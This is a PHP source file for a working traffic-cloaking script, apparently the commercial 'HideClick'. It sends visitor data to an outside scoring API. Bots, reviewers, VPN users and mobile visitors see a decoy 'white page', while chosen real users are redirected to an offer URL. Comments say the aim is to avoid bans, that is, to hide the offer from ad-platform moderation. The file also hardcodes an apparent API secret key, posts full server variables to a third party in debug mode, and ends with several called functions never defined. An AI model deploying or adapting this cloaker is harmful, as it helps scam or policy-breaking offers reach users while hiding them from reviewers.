<?php
/* change 'false' to 'true' to enable passive traffic analytics mode (Ignoring white|offer setting, disabling site protection and bot filtering mode!) Use it as google analytics alternative */
$HCSET['PASSIVE'] = false;

/* Required settings     */
$HCSET['WHITE_PAGE'] = 'home.html';//PHP/HTML file or URL used for bots
$HCSET['OFFER_PAGE'] = 'https://vidlq.site/en.html';//PHP/HTML file or URL offer used for real users
$HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
/*********************************************/
/* Available additional settings  */

/* COUNTRY FILTERS */
$HCSET['FILTER_GEO_MODE'] = ''; // string(allow|reject)
$HCSET['FILTER_GEO_LIST'] = ''; // string([2Chars country codes])

/* DEVICE FILTERS */
$HCSET['FILTER_DEV_MODE'] = 'reject'; // 'allow|reject'
$HCSET['FILTER_DEV_LIST'] = 'm_Android,m_iOS,m_other,d_macOS,d_other'; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);

/* UTM FILTERS */
$HCSET['FILTER_UTM_MODE'] = ''; // 'allow|reject'
$HCSET['FILTER_UTM_LIST'] = ''; // 'regExp()';

/* REFERER FILTERS */
$HCSET['FILTER_REF_MODE'] = ''; // 'allow|reject'
$HCSET['FILTER_REF_LIST'] = ''; // 'regExp()';
$HCSET['FILTER_NOREF'] = ''; // 'allow|reject';

/* NETWORK FILTERS */
$HCSET['FILTER_NET_MODE'] = 'reject'; // 'allow|reject'
$HCSET['FILTER_NET_LIST'] = 'vpn'; // string([vpn|mobile|residential|corporate]);

/* NETWORK FILTERS */
$HCSET['FILTER_BRO_MODE'] = ''; // 'allow|reject'
$HCSET['FILTER_BRO_LIST'] = ''; // string([Chrome|Safari|FF|Other]);

/* custom AI models and settings for PRO version */
$HCSET['mlSet'] = '';

/* OFFER_PAGE display method. Available options: meta, 302, iframe */
/* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
/* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
/* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
$HCSET['OFFER_METHOD'] = '302';

/* WHITE_PAGE display method. Available options: curl, 302 */
/* 'curl' - uses a server request to display third-party whitepage on your domain */
/* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
$HCSET['WHITE_METHOD'] = 'curl';

/* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
$HCSET['BLOCK_DDOS'] = false;
/* DELAY_START allows you to block the first X unique IP addresses. */
$HCSET['DELAY_START'] = 0;
/* DELAY_PERMANENT always show the whitepage for IP in the list of first X requests */
$HCSET['DELAY_PERMANENT'] = false;
/* DELAY_NONBOT do not count blocked request in DELAY_START counter */
$HCSET['DELAY_NONBOT'] = false;
/* USE_SESSIONS do not block user's request after successful check */
$HCSET['USE_SESSIONS'] = true;

/* The next settings are needed only if your hosting isn't standart or something doesn't work */
/* delete symbols "//" in the next line if service doesn't work or you use CDN, Varnish or other caching proxy */
//$HCSET['DISABLE_CACHE'] = true;
/*********************************************/
/* You API key.                              */
/* DO NOT SHARE API KEY! KEEP IT SECRET!     */
$HCSET['API_SECRET_KEY'] = 'v1c0c869b0f2d34a5fa703120647d55431';
/*********************************************/
// DO NOT EDIT ANYTHING BELOW !!!
if (!empty($HCSET['VERSION']) || !empty($GLOBALS['HCSET']['VERSION'])) die('Recursion Error');
// dirty hacks to protect from death loops
if (function_exists('debug_backtrace') && sizeof(debug_backtrace()) > 2) {
    echo "WARNING: INFINITE RECURSION PROTECTION";
    die();
}
$HCSET['VERSION'] = 20230303;
/* dirty fix!!! uncomment only if problem with IP detection!!! */
//if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];

$errorContactMessage = "<br><br>Something went wrong. Contact support";
if (!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}$#', $_GET['utm_allow_geo'])) {
    $HCSET['FILTER_GEO_LIST'] = $_GET['utm_allow_geo'];
    $HCSET['FILTER_GEO_MODE'] = 'allow';
}
if (empty($HCSET['DISABLE_CACHE'])) $HCSET['DISABLE_CACHE'] = '';
if ($HCSET['DISABLE_CACHE']) {
    setcookie("euConsent", 'true');
    setcookie("BC_GDPR", time());
    header("Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0");
    header("Pragma: no-cache");
    header("Expires: " . date('D, d M Y H:i:s', rand(1560500925, 1571559523)) . " GMT");
} else if (!empty($_SERVER['VIA']) || !empty($_SERVER['HTTP_VIA']) || !empty($_SERVER['Via']) || !empty($_SERVER['via']) || !empty($_SERVER['X-LSCACHE'])) {
    header("Cache-control:no-cache");
}

if (!empty($_REQUEST['hctest']) && ($HCSET['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key'] == $HCSET['API_SECRET_KEY']))) {
    if (function_exists('ini_set')) {
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
    }
    if (function_exists('error_reporting')) {
        error_reporting(E_ALL);
    }
    if ($_REQUEST['hctest'] == 'white') showWhitePage($HCSET['WHITE_PAGE'], $HCSET['WHITE_METHOD']);
    else if ($_REQUEST['hctest'] == 'offer') showOfferPage($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD']);
    else if ($_REQUEST['hctest'] == 'debug') {
        if (function_exists('phpinfo')) phpinfo();
        if (function_exists('debug_backtrace')) print_r(debug_backtrace());
        $HCSET['API_SECRET_KEY'] = 1;
        print_r($HCSET);
        die();
    }
    else if ($_REQUEST['hctest'] == 'test') {
        if (!function_exists('curl_init')) {
            echo "<br>CURL not found<br>\n";
            $http_response_header = array();
            echo "HTTP domain";
            $statistic = file_get_contents('http://api.hideapi.xyz/status', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'protocol_version' => 1.1, 'timeout' => 5, 'header' => "Content-type: application/json\r\nConnection: close\r\n" . "Content-Length: 4\r\n", 'content' => 'ping'))));
            print_r($http_response_header);
            echo "<br>\n";
            print_r($statistic);
            echo "<hr>\n";
        } else {
            $body = 'ping';
            echo "<br>using CURL<br>\n";
            $ch = curl_init();
            echo "HTTP domain";
            curl_setopt($ch, CURLOPT_URL, 'http://api.hideapi.xyz/status');
            if (!empty($body)) {
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
            }
            if (!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $r = @curl_exec($ch);
            $info = curl_getinfo($ch);
            print_r($info);
            echo "<br>\n";
            curl_close($ch);
            echo "$r<hr>\n";
        }
    }
    else if ($_REQUEST['hctest'] == 'time') {
        header("Cache-control: public, max-age=999999, s-maxage=999999");
        header("Expires: Wed, 21 Oct 2025 07:28:00 GMT");
        echo str_replace(" ", "", rand(1, 10000) . microtime() . rand(1, 100000));
    }
    die();
}

if ($HCSET['DEBUG_MODE'] == 'on') {
    if (function_exists('set_time_limit')) {
        set_time_limit(5);
    }
    if (function_exists('ini_set')) {
        ini_set('max_execution_time', 5);
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
    }
    if (function_exists('error_reporting')) {
        error_reporting(E_ALL);
    }

    if (!function_exists('http_build_query') || !function_exists('setcookie') || !function_exists('json_encode') || !function_exists('json_decode')) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>Error: Installed PHP version doesnt support an function: <i>http_build_query, setcookie, json_encode, json_decode</i>. Ask your hosting support to upgrade PHP to latest version. " . $errorContactMessage;
        die();
    }
    if (!function_exists('curl_init') && !function_exists('file_get_contents')) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>Error: Installed PHP version doesnt support remote url functions: <i>curl_init, file_get_contents</i>. Contact your hosting support to enable <b>curl</b>. " . $errorContactMessage;
        die();
    }

    $error = 0;
    setcookie("hideclick", 'ignore', time() + 604800);
    // don't use $_SERVER["REDIRECT_URL"], as there is servers that use it without redirect
    if (!empty($_GET) || !empty($_POST) || ($_SERVER["SCRIPT_NAME"] != $_SERVER["REQUEST_URI"] && $_SERVER["REQUEST_URI"] != str_replace("index.php", "", $_SERVER["SCRIPT_NAME"]))) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>Error with rewrite engine.<!--//'" . $_SERVER["SCRIPT_NAME"] . "'!='" . $_SERVER["REQUEST_URI"] . "'//--><br><b><a onclick='var z = new URL(location.href);location.href=z.origin+z.pathname;'>Сlick here to try to fix it automatically</a></b><br>" . $errorContactMessage;
        die();
    }
    echo '<html><head><meta name="robots" content="noindex"><meta charset="UTF-8"><style type="text/css">body, html {font-family: Calibri, Ebrima;}img {margin-left:2em;opacity: 0.25;}img:hover {opacity: 1.0;}</style></head><body><b>Congratulations.</b><br>Literally in a moment you can increase your ROI.<br><br><b>First, make sure that everything is configured correctly:</b><br>';
    if (is_file($HCSET['WHITE_PAGE'])) echo '✔ WHITE_PAGE - ok. <a target="_blank" href="?hctest=white">Click here to check the WHITE_PAGE</a>.<br>';
    else if (strstr($HCSET['WHITE_PAGE'], '://')) echo '⚠ To reduce the likelihood of a ban, we recommend using local WHITE_PAGE (page located on your website)! If you still want to use the current settings, <a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>.<br>';
    else if (preg_match('#^/#',$HCSET['WHITE_PAGE']) && is_file('.'.$HCSET['WHITE_PAGE'])) echo '❌ WHITE_PAGE - error! Invalid file path. Try to add a dot like <b>'.'.'.$HCSET['WHITE_PAGE'].'</b> in line<b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b><br><img src="https://hide.click/gif/white.gif" border="1"><br>';
    else if (preg_match('#[.][a-zA-Z]#',$HCSET['WHITE_PAGE']) && preg_match('#[.][^hp/]#',$HCSET['WHITE_PAGE'])) echo '❌ WHITE_PAGE - error! File not found. If you are using an external site - add <b>https://</b> before the domain name. Fix the value in line <b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b><br><img src="https://hide.click/gif/white.gif" border="1"><br>';
    else if ($HCSET['PASSIVE'] !== true) {
        echo '❌ WHITE_PAGE - error! Change the value in line <b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b> to the page that will be displayed to bots<br><img src="https://hide.click/gif/white.gif" border="1"><br>';
        $error = 1;
    }

    if (is_file($HCSET['OFFER_PAGE']) && ($HCSET['OFFER_PAGE'] == 'index.htm' || $HCSET['OFFER_PAGE'] == 'index.html' || $HCSET['OFFER_PAGE'] == 'index.php')) {
        echo '⚠ To reduce the likelihood of a ban, rename OFFER_PAGE (for example, <b>offer.php</b> instead of <b>' . $HCSET['OFFER_PAGE'] . '</b>) and put new name in line <b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b> <img src="https://hide.click/gif/black.gif" border="1"><br>';
    }
    else if (is_file($HCSET['OFFER_PAGE']) || strstr($HCSET['OFFER_PAGE'], '://')) echo '✔ OFFER_PAGE - ok. <a target="_blank" href="?hctest=offer">Click to check the OFFER_PAGE</a>.<br>';
    else if (preg_match('#^/#',$HCSET['OFFER_PAGE']) && is_file('.'.$HCSET['OFFER_PAGE'])) echo '❌ OFFER_PAGE - error! Invalid file path. Try to add a dot like <b>'.'.'.$HCSET['OFFER_PAGE'].'</b> in line<b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b><br><img src="https://hide.click/gif/white.gif" border="1"><br>';
    else if (preg_match('#[.][a-zA-Z]#',$HCSET['OFFER_PAGE']) && preg_match('#[.][^hp/]#',$HCSET['OFFER_PAGE'])) echo '❌ OFFER_PAGE - error! File not found. If you are using an external site - add <b>https://</b> before the domain name. Fix the value in line <b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b><br><img src="https://hide.click/gif/white.gif" border="1"><br>';
    else if ($HCSET['PASSIVE'] !== true) {
        echo '❌ OFFER_PAGE - error! Change the value in line <b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b> to the page that will be displayed to targeted users<br><img src="https://hide.click/gif/black.gif" border="1"><br>';
        $error = 1;
    }
    $HCSETdata = json_encode($_SERVER);//$_ENV;

    $HCSET['STATUS'] = apiRequest('1.1.1.1', '1111', $HCSET, $HCSETdata);

    if (empty($HCSET['STATUS'])) {
        echo '❌ Network configuration error. Contact your hosting support and ask them to allow external URL requests or use reliable DNS resolver like (8.8.8.8 or 1.1.1.1).<br>';
        $error = 1;
    } elseif (empty(json_decode($HCSET['STATUS'], true))) {
//        echo '❌ Network error. Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
        echo '❌ Error: corrupted data. Contact your hosting support and ask them to allow external URL requests and use reliable DNS resolver like (8.8.8.8 or 1.1.1.1).<br><code>' . $HCSET['STATUS'] . '</code><br>';
        $error = 1;
    } else {
        $HCSET['STATUS'] = json_decode($HCSET['STATUS'], true);

        if (!empty($_SERVER['HTTP_HOST'])) $hostname = $_SERVER['HTTP_HOST'];
        else if (!empty($_SERVER['Host'])) $hostname = $_SERVER['Host'];
        else if (!empty($_SERVER['host'])) $hostname = $_SERVER['host'];
        else if (!empty($_SERVER[':authority'])) $hostname = $_SERVER[':authority'];
        else $hostname = '';
        if (!$hostname || !preg_match('#[a-zA-Z\.]#', $hostname) || preg_match('#:#', $hostname)) {
            echo '❌ Error with ' . $hostname . ' domain name: you need valid domain and ssl certificate to use service. Contact us if you have any questions.<br><br>';
            $error = 1;
        } else if (empty($_SERVER['REQUEST_URI'])) {
            echo '❌ Error with PHP $_SERVER["REQUEST_URI"]: Contact your hosting support and ask them to fix PHP installation. Contact us if you have any questions.<br><br>';
            $error = 1;
        } else if ((empty($HCSET['STATUS']['action']) && empty($HCSET['STATUS']['error']))) {
            echo '❌ Error: non valid json. Contact us if you have any questions.<br><br><code>' . json_encode($HCSET['STATUS']) . '</code><br>';
            $error = 1;
        } else if (!empty($HCSET['STATUS']['error'])) {
            if ($HCSET['STATUS']['error'] == 'Unauthorized') {
                echo '❌ Your secret API key has expired or blocked due terms violation. Contact support to extend the service!<br>';
            } else {
                echo '❌ ' . $HCSET['STATUS']['error'] . '!<br>';
            }
            $error = 1;
        }
    }

    if (!$error) {
        $HCSETdata = json_encode(getHeaders());
        $HCSET['STATUS'] = apiRequest($_SERVER["REMOTE_ADDR"], $_SERVER["REMOTE_PORT"], $HCSET, $HCSETdata);
        $HCSET['STATUS'] = json_decode($HCSET['STATUS'], true);

        if (empty($HCSET['STATUS']) || empty($HCSET['STATUS']['action'])) {
            echo '❌ Bad network! Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
            $error = 1;
        }
        if ($HCSET['STATUS']['action'] != 'allow') {
//        echo '⚠ We do not recommend using VPN, anonymizers, privacy plugins or antidetect browsers during the setup process<br><br>';
            echo '⚠ You may not see the offer if you are using VPN/proxy/developer_extensions/privacy_plugins/antidetect_browsers or other security tools during the setup process. Use standart browser and local/WiFi/mobile coonection to check offer page<br><br>';
        }
    }
    // Needed to check if cache is using
    $testUrl = ($_SERVER["SERVER_PORT"] == 443 || (!empty($_SERVER['HTTP_CF_VISITOR']) && stristr($_SERVER['HTTP_CF_VISITOR'], 'https')) || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') || !empty($_SERVER['HTTPS'])) ? 'https://' : 'http://';
    // There's some bugs with CDN if using $_SERVER['HTTP_HOST'], so use $_SERVER["SERVER_NAME"] instead!
    $queryBug = strpos($_SERVER["REQUEST_URI"], '?');
    if (empty($_SERVER["SERVER_NAME"]) || $_SERVER["SERVER_NAME"] == '_' || $_SERVER["SERVER_NAME"] == 'localhost') $_SERVER["SERVER_NAME"] = $_SERVER["HTTP_HOST"];
    if ($queryBug > 0) $testUrl .= $_SERVER["SERVER_NAME"] . substr($_SERVER["REQUEST_URI"], 0, $queryBug) . '?hctest=time';
    else $testUrl .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] . '?hctest=time';
    $http_response_header = array();
    $static1 = !function_exists('curl_init') ? file_get_contents($testUrl, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl' => array('verify_peer' => false, 'verify_peer_name' => false,)))) : curlRequst($testUrl);
    $static2 = !function_exists('curl_init') ? file_get_contents($testUrl, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl' => array('verify_peer' => false, 'verify_peer_name' => false,)))) : curlRequst($testUrl);
    $static3 = !function_exists('curl_init') ? implode("\n", $http_response_header) : curlRequst($testUrl, '', true);
    // Set-Cookie vs empty($HCSET['DISABLE_CACHE']) || !empty($HCSET['DISABLE_CACHE']) ???
    // x-cache-enabled: True
    // x-proxy-cache: HIT
    if (preg_match('#Proxy|Microcachable|X-Endurance-Cache-Level#i', $static3) || (empty($HCSET['DISABLE_CACHE']) && preg_match('#Set-Cookie#i', $static3) && !strstr($static3, '__cfduid='))) {
        echo '❌ Bad server configuration. Contact us. We will help.<br><br>';
    } else if ($static1 > 0 && $static2 > 0 && $static1 <= 100000 && $static2 <= 100000 && $static1 != $static2) {
    } else if (empty($static1) || empty($static2)) {
        echo "❌ Bad server configuration. Contact us. We will try to help.<!-- $static1 | $static2--><br><br>";
        $error = 1;
    } else if (empty($HCSET['DISABLE_CACHE'])) {
        echo '❌ Bad server configuration. Remove <b>//</b> at the beginning of a line <b>#' . inlineEditor("\$HCSET['DISABLE_CACHE']") . '</b> to activate "DISABLE_CACHE" mode.<br><img src="https://hide.click/gif/cache.gif" border="1"><br><br>';
        $error = 1;
    }
    if (preg_match('#x-cache-enabled.*True#i', $static3)) {// || (!empty($_SERVER['X-LSCACHE']) &&  $_SERVER['X-LSCACHE']=='on')
        echo '❌ Bad server. The current server caches the results, which will lead to large traffic losses and a high probability of being banned. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
        $error = 1;
    }
//    else if(!empty($HCSET['DISABLE_CACHE'])) {
//        echo '❌ Bad server configuration. Ask hosting support to turn off caching (or move website to another hosting).<br><br>';
//        $error=1;
//    }
    if ($HCSET['DELAY_START']) {
        file_put_contents('dummyCounter.txt', '');
        if (!is_file('dummyCounter.txt')) {
            echo '❌ In order DELAY_START filter to work you need to create a file <b>dummyCounter.txt</b> in the directory <b>' . getcwd() . '</b>. Make sure that the file is writable.<br>';
            $error = 1;
        } else if (!is_writable('dummyCounter.txt')) {
            echo '❌ Make sure that the <b>dummyCounter.txt</b> file located in <b>' . getcwd() . '</b>  is writable.<br>';
            $error = 1;
        }
    }
    if ($HCSET['BLOCK_DDOS']) {
        file_put_contents('dummyDDOS.txt', '');
        if (!is_file('dummyDDOS.txt')) {
            echo '❌ In order BLOCK_DDOS to work you need to create a file <b>dummyDDOS.txt</b> in the directory <b>' . getcwd() . '</b>. Make sure that the file is writable.<br>';
            $error = 1;
        } else if (!is_writable('dummyCounter.txt')) {
            echo '❌ Make sure that the <b>dummyDDOS.txt</b> file located in <b>' . getcwd() . '</b>  is writable.<br>';
            $error = 1;
        }
    }

    if ($error) {
        echo "<br><b>Correct the errors and reload the page.</b><br><br>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";
        die();
    }

    if (!empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR'])) {
        if ($_SERVER['REMOTE_ADDR'] == $_SERVER['SERVER_ADDR'] && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            echo '❌ looks like your server falsify the user\'s IP address. Probably you need a different hosting. Contact us if you have any questions.<br>';
        } else if (preg_match('#^[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+#', $_SERVER['REMOTE_ADDR'], $cid) && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            if (stristr('#' . $_SERVER['SERVER_ADDR'], '#' . $cid[0])) echo '❌ looks like your server falsify the user\'s IP address. You need a different hosting. Contact us if you have any questions.<br>';
        }
    }
    if (empty($_SERVER['HTTP_CF_RAY']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_REAL_IP']) && !empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] == $_SERVER['HTTP_X_REAL_IP'] && $_SERVER['HTTP_X_REAL_IP'] != $_SERVER['REMOTE_ADDR'] && $_SERVER['REMOTE_ADDR'] != $_SERVER['SERVER_ADDR']) {
        echo '❌ It looks like your server falsify the user IP address. Contact us via telegram: <a href="tg://resolve?domain=HideClick">@HideClick</a> to make sure everything is working correctly.<br>';
    }
    echo 'Excellent. Setup completed.<br>In the future, you can use this file for any number of domains. There is no need to repeat this process on this hosting.<br><br>';
    echo '<b><u>Last step:</u></b><br>If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#' . inlineEditor("\$HCSET['DEBUG_MODE']") . '</b> to <b>off</b>.<br><img src="https://hide.click/gif/debug.gif" border="1"><br>';
    echo 'After that, the script will start working in production mode and instead of this page you will see offer page or white page (depends on settings).<br><br>';
    die();
}
else if ($HCSET['PASSIVE'] !== true) {
    if (empty($HCSET['WHITE_PAGE']) || (!strstr($HCSET['WHITE_PAGE'], '://') && !is_file($HCSET['WHITE_PAGE']))) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: " . $HCSET['WHITE_PAGE'] . "! \r\n<br>" . $errorContactMessage;
        die();
    }
    if (empty($HCSET['OFFER_PAGE']) || (!strstr($HCSET['OFFER_PAGE'], '://') && !is_file($HCSET['OFFER_PAGE']))) {
        echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: " . $HCSET['OFFER_PAGE'] . "! \r\n<br>" . $errorContactMessage;
        die();
    }
    if (function_exists('header_remove')) header_remove("X-Powered-By");
    if (function_exists('ini_set')) @ini_set('expose_php', 'off');
}

// start of code
if ($HCSET['BLOCK_DDOS']) {
    blockDDOS();
}

$HCSETdata = getHeaders();

$HCSET['banReason'] = '';
$HCSET['skipReason'] = '';

if(!empty($_COOKIE['hcsid']) && $_COOKIE['hcsid']==hashDev() && $HCSET['USE_SESSIONS']) $HCSET['skipReason'] = 'cookie';

if ($HCSET['DELAY_START']) {
    $ips = file('dummyCounter.txt', FILE_IGNORE_NEW_LINES);
    if (empty($ips)) {
        $ips = array(0 => 0);
        file_put_contents('dummyCounter.txt', "0\n", FILE_APPEND);
    } else $ips = array_flip($ips);

    if (sizeof($ips) <= $HCSET['DELAY_START']) {
        $HCSET['banReason'] .= 'delaystart.';
    }
    if (!empty($ips[hashIP()]) && $HCSET['DELAY_PERMANENT']) {
        $HCSET['banReason'] .= 'delaystartperm.';
    }
}

$HCSETdata = json_encode($HCSETdata);
// Data for ML postprocessing
$HCSET['W_'] = (substr($HCSET['WHITE_PAGE'], 0, 8) == 'https://' || substr($HCSET['WHITE_PAGE'], 0, 7) == 'http://') ? '' : file_get_contents($HCSET['WHITE_PAGE']);
$HCSET['O_'] = (substr($HCSET['OFFER_PAGE'], 0, 8) == 'https://' || substr($HCSET['OFFER_PAGE'], 0, 7) == 'http://') ? '' : file_get_contents($HCSET['OFFER_PAGE']);
$HCSET['W_CRC'] = crc32($HCSET['W_']);
$HCSET['O_CRC'] = crc32($HCSET['O_']);
if(preg_match_all('#[\'"]https://[^/]*(yandex|google|facebook|bytedance|linkedin|twitter|adobe|pinterest|doubleclick|bing|hubspot|marketo|oracle|salesforce|snapchat|reddit|quora|outbrain|taboola|adroll|criteo|appnexus|thetradedesk|mediamath|amazon|hotjar|mouseflow|crazyegg|mixpanel|intercom|zendesk|freshchat|drift|mailchimp|campaignmonitor|constantcontact|klaviyo|drip|activecampaign|getresponse|aweber|convertkit|shopify|woocommerce|magento|bigcommerce|squarespace|wix|wordpress|joomla|drupal|weebly|jimdo|godaddy|strikingly|webflow|optimizely)[^\'"]+\.js#', $HCSET['W_'],$match)){
    $HCSET['W_PIXELS'] = implode(',',$match[1]);
}
if(preg_match_all('#[\'"]https://[^/]*(yandex|google|facebook|bytedance|linkedin|twitter|adobe|pinterest|doubleclick|bing|hubspot|marketo|oracle|salesforce|snapchat|reddit|quora|outbrain|taboola|adroll|criteo|appnexus|thetradedesk|mediamath|amazon|hotjar|mouseflow|crazyegg|mixpanel|intercom|zendesk|freshchat|drift|mailchimp|campaignmonitor|constantcontact|klaviyo|drip|activecampaign|getresponse|aweber|convertkit|shopify|woocommerce|magento|bigcommerce|squarespace|wix|wordpress|joomla|drupal|weebly|jimdo|godaddy|strikingly|webflow|optimizely)[^\'"]+\.js#', $HCSET['O_'],$match)){
    $HCSET['O_PIXELS'] = implode(',',$match[1]);
}

$HCSET['STATUS'] = apiRequest($_SERVER["REMOTE_ADDR"], $_SERVER["REMOTE_PORT"], $HCSET, $HCSETdata);
$HCSET['STATUS'] = json_decode($HCSET['STATUS'], true);

// after scoring actions include permanent DDOS and bad actors IP blocking
if ($HCSET['DELAY_START'] && empty($ips[hashIP()])) {
    if (sizeof($ips) <= $HCSET['DELAY_START']) {
        if (!empty($HCSET['STATUS']) && !empty($HCSET['STATUS']['action']) && $HCSET['STATUS']['action'] == 'allow') file_put_contents('dummyCounter.txt', hashIP() . "\n", FILE_APPEND);
        else if ($HCSET['DELAY_NONBOT'] !== true) file_put_contents('dummyCounter.txt', hashIP() . "\n", FILE_APPEND);
    }
}
if ($HCSET['BLOCK_DDOS']) {
    if (!empty($HCSET['STATUS']['ddos'])) {
        // warning: it's permanent ban! we will not knowing when ddos is over!
        // we can block single IP, or use IP mask if needed.
        file_put_contents('dummyCounter.txt', $HCSET['STATUS']['ddos'] . "\n", FILE_APPEND);
    }
}

if ($HCSET['PASSIVE'] !== true) {
    if (empty($HCSET['banReason']) && !empty($HCSET['STATUS']) && !empty($HCSET['STATUS']['action']) && $HCSET['STATUS']['action'] == 'allow') {
        showOfferPage($HCSET['OFFER_PAGE'], $HCSET['OFFER_METHOD'], $HCSET['STATUS']);
    } else {
        showWhitePage($HCSET['WHITE_PAGE'], $HCSET['WHITE_METHOD'], $HCSET['STATUS']);
    }
    die();
}

function showOfferPage($offer, $method = 'meta', $req_country = '')
{
    setcookie('hcsid', hashDev(), time() + 604800);
    if (substr($offer, 0, 8) == 'https://' || substr($offer, 0, 7) == 'http://') {
        if (!empty($_GET) && !stristr($method,'privacy')) {
            if (strstr($offer, '?')) $offer .= '&' . http_build_query($_GET);
            else $offer .= '?' . http_build_query($_GET);
        }

        if (strstr($offer, '{hc_geo}')) {
            if(!empty($status['geo'])) $offer = str_replace('{hc_geo}', $status['geo'], $offer);
        } else if (strstr($offer, '%7Breq_geo%7D')) {
            if(!empty($status['geo'])) $offer = str_replace('%7Bhc_geo%7D', $status['geo'], $offer);
        }
        if (strstr($offer, '{hc_uid}')) {
            if(!empty($status['uid'])) $offer = str_replace('{hc_uid}', $status['uid'], $offer);
        } else if (strstr($offer, '%7Breq_uid%7D')) {
            if(!empty($status['uid'])) $offer = str_replace('%7Bhc_uid%7D', $status['uid'], $offer);
        }

        if ($method == '302privacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            header("Location: " . $offer);
        } else if ($method == '302') {
            header("Location: " . $offer);
        } else if ($method == 'iframeprivacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen' rel='noreferrer noopener'></iframe></body></html>";
        } else if ($method == 'iframe') {
            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
        } else if ($method == 'metaprivacy') {
            header("Referrer-Policy: no-referrer");
            header("Content-Security-Policy: referrer no-referrer");
            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
        } else {
            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
        }
    } else {
        require_once($offer);
    }
    die();
}

